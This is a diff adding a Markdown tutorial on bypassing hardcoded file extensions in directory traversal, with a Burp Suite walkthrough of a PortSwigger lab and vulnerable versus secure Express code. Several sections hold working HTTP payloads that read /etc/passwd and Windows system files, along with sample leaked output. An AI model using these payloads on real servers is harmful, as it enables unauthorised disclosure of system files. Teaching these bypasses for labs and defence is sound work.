@@ -1,0 +1,279 @@
+# Directory Traversal: Bypassing Hardcoded Extensions (Null Byte & Truncation)
+
+In web application architectures, developers frequently attempt to enforce boundary security by **hardcoding fixed file extensions** (such as automatically appending `.png`, `.jpg`, or `.php`) on the backend server.
+
+Under this assumption, developers believe attackers cannot read critical system files like `/etc/passwd` because the server will always attempt to load non-existent files such as `/etc/passwd.png`.
+
+However, multiple low-level string termination and path truncation techniques—most notably **Null Byte Injection (`%00`)**—can bypass hardcoded extension restrictions.
+
+---
+
+## 1. Vulnerability Concept: Why Do Hardcoded Extensions Fail?
+
+Consider this common backend pattern for serving product images:
+
+```javascript
+// Backend concatenates directory path and enforces the .png extension
+const filename = req.query.filename;
+const fullPath = "/var/www/public/images/" + filename + ".png";
+
+fs.readFile(fullPath, (err, data) => {
+  if (err) return res.status(404).send("File not found.");
+  res.sendFile(fullPath);
+});
+```
+
+### Why Standard Traversal Fails
+When an attacker attempts a standard traversal payload:
+```http
+GET /image?filename=../../../etc/passwd HTTP/1.1
+```
+
+The backend server constructs the path:
+```text
+/var/www/public/images/../../../etc/passwd.png
+=> Resolves to: /etc/passwd.png
+```
+
+Because `/etc/passwd.png` **does not exist on the Linux filesystem**, the server responds with a `404 Not Found` error.
+
+---
+
+## 2. Exploitation Flow: Bypassing Hardcoded Extensions
+
+![Directory Traversal Hardcoded Extension Bypass](/images/directory-traversal-hardcoded-extension.svg)
+
+---
+
+## 3. Five Methods to Bypass Hardcoded Extensions
+
+Attackers utilize the following string manipulation and truncation methods to neutralize hardcoded suffixes:
+
+---
+
+### Method 1: Null Byte Injection (`%00` / `\0`)
+
+Null Byte Injection is a legendary low-level exploit technique in computer security history.
+
+#### Mechanism at the Operating System Level:
+1. High-level languages and runtimes (including older PHP, C-extended Python, Perl, and legacy Java) invoke standard C runtime system calls (such as `fopen()`, `open()`, or `stat()`) to interact with the OS filesystem.
+2. In the **C-String standard**, strings do not maintain an explicit length counter in memory; they are terminated by a **Null Character (`\0` or byte `0x00`)**.
+3. When the URL-encoded byte `%00` is submitted, the backend receives:
+   ```text
+   /var/www/images/../../../etc/passwd\0.png
+   ```
+4. High-level application logic (such as `filename.endsWith(".png")`) validates successfully because the string terminates with `.png`.
+5. However, when passed to the POSIX C function `fopen()`, the kernel reads the path character-by-character and **halts upon encountering the `\0` byte**, completely ignoring the trailing `.png` extension!
+
+#### Example Payloads:
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
+GET /image?filename=/etc/passwd%00.jpg HTTP/1.1
+```
+
+> [!NOTE]
+> **Modern Security Status:** Null Byte injection was resolved in PHP >= 5.3.4, Java 7+, and modern Node.js. Nonetheless, it remains prevalent in legacy enterprise environments, native C/C++ backend daemons, embedded firmware, and security testing labs/CTFs.
+
+---
+
+### Method 2: Query String Truncation (`?` and `#` / `%23`)
+
+When backend services retrieve files through internal URI wrappers or HTTP streaming functions (e.g. `file:///`, cURL, `fetch()`, or internal proxy sub-requests):
+
+#### Mechanism:
+When the backend appends `.png` to an input containing a question mark `?`, the resulting URI becomes:
+```text
+file:///var/www/images/../../../etc/passwd?.png
+```
+The `?` is treated as a URL query delimiter, causing the filesystem stream resolver to disregard `?.png` and load strictly `/etc/passwd`.
+
+#### Example Payloads:
+```http
+GET /image?filename=../../../etc/passwd? HTTP/1.1
+GET /image?filename=/etc/passwd%23 HTTP/1.1
+```
+*(Note: `%23` is the URL-encoded representation of `#` for fragment identifiers).*
+
+---
+
+### Method 3: Path Parameter Matrix / Semicolon (`;`)
+
+In Java-based environments like **Apache Tomcat** and **Spring Framework**, semicolons (`;`) delimit matrix URL parameters:
+
+#### Mechanism:
+The backend concatenates:
+```text
+/etc/passwd;.png
+```
+Tomcat/Spring separates the prefix before the semicolon as the genuine resource path (`/etc/passwd`) while treating `;.png` as an optional matrix attribute.
+
+#### Example Payload:
+```http
+GET /image?filename=/etc/passwd;.png HTTP/1.1
+```
+
+---
+
+### Method 4: Windows NTFS Normalization (Trailing Dots & ADS)
+
+The **Windows NTFS** filesystem implements unique path normalization rules:
+
+1. **Trailing Dots (`.`):** Windows automatically strips trailing dots and whitespace from filenames.
+   - Example: `GET /image?filename=..\..\boot.ini.`
+2. **Alternate Data Streams (ADS `::$DATA`):** Windows files support the default `$DATA` stream descriptor.
+   - Example: `GET /image?filename=..\..\windows\win.ini::$DATA`
+
+---
+
+### Method 5: Path Length Truncation (Buffer Overflow via `./././`)
+
+On legacy operating systems and early language runtimes, filesystem functions enforced strict `MAX_PATH` buffer capacities (e.g. 4096 bytes on Linux or 260 bytes on Windows):
+
+#### Mechanism:
+An attacker pads the traversal path with repeated `./` sequences until the allocated buffer limit is exceeded:
+```text
+../../../etc/passwd/./././././...[repeated to 4096 characters]...
+```
+When the backend appends `.png` at the far right, the extension overflows the buffer and gets discarded by the OS.
+
+---
+
+## 4. Step-by-Step Practical Exploitation with Burp Suite
+
+Follow this walkthrough to solve the PortSwigger lab scenario (*File path traversal, validation of file extension with null byte bypass*):
+
+---
+
+### Step 1: Intercept the Image Request
+1. Access the target application using the integrated **Burp Suite** browser.
+2. Select a product image and locate the request in **Proxy** > **HTTP history**:
+   ```http
+   GET /image?filename=25.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+
+---
+
+### Step 2: Send Request to Burp Repeater
+1. Right-click the request and choose **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+2. Switch to the **Repeater** tab.
+
+---
+
+### Step 3: Test Standard Traversal (Observe 404 Error)
+1. Replace `filename` with:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. The server replies with `404 Not Found: "File not found /etc/passwd.jpg"`, verifying that the `.jpg` extension is appended automatically.
+
+---
+
+### Step 4: Apply the Null Byte Bypass (`%00`)
+1. Insert `%00.jpg` at the end of the payload:
+
+```http
+GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Click **Send**.
+
+---
+
+### Step 5: Verify the Leaked Sensitive File
+1. Inspect the **Response** panel on the right.
+2. The server responds with status **`200 OK`** and returns the contents of `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. The lab is completed successfully (*Solved*)! 🎉
+
+---
+
+## 5. Backend Source Code: Vulnerable vs. Secure
+
+### ❌ Vulnerable Implementation (Naive String Concatenation)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const filename = req.query.filename as string;
+
+  // ❌ Naive concatenation with hardcoded extension
+  // Vulnerable to Null Byte (%00), Query String (?), and Traversal (../)
+  const fullPath = path.join("/var/www/public/images", filename + ".png");
+
+  fs.readFile(fullPath, (err, data) => {
+    if (err) return res.status(404).send("File not found.");
+    return res.type("png").send(data);
+  });
+});
+```
+
+---
+
+### ✅ Secure Implementation (Strict Character Whitelist & Directory Containment)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  // 1. Strict Validation: Reject null bytes (\0 / %00), slashes, and double dots
+  if (!filename || typeof filename !== "string") {
+    return res.status(400).json({ error: "Invalid parameter." });
+  }
+
+  // Reject non-alphanumeric characters
+  if (!/^[a-zA-Z0-9_-]+$/.test(filename)) {
+    return res.status(400).json({ error: "Illegal characters detected." });
+  }
+
+  // 2. Safely concatenate with trusted extension
+  const safeFilename = `${filename}.png`;
+  const targetPath = path.resolve(BASE_DIR, safeFilename);
+
+  // 3. Verify directory containment (Canonical Check)
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Access outside working directory denied." });
+  }
+
+  // 4. Verify file existence before serving
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "File not found." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 6. Mitigation Summary & Best Practices
+
+1. **Adopt Database ID Lookups (Indirect Object References):**
+   Map files to random UUID identifiers in database records rather than exposing raw filesystem paths.
+2. **Enforce Strict Alphanumeric Regex Whitelisting:**
+   Permit strictly `[a-zA-Z0-9_-]`. Reject inputs containing `%00`, `/`, `\`, `.`, `;`, or `?`.
+3. **Execute Path Normalization & Canonical Containment Checks:**
+   Utilize `path.resolve()` or `realpath()` and assert that the target path remains inside `BASE_DIR`.
+4. **Upgrade Runtimes & Frameworks to Modern Releases:**
+   Maintain up-to-date runtimes (PHP 8+, Java 17+, Node.js LTS) that natively invalidate null byte characters in filesystem I/O operations.
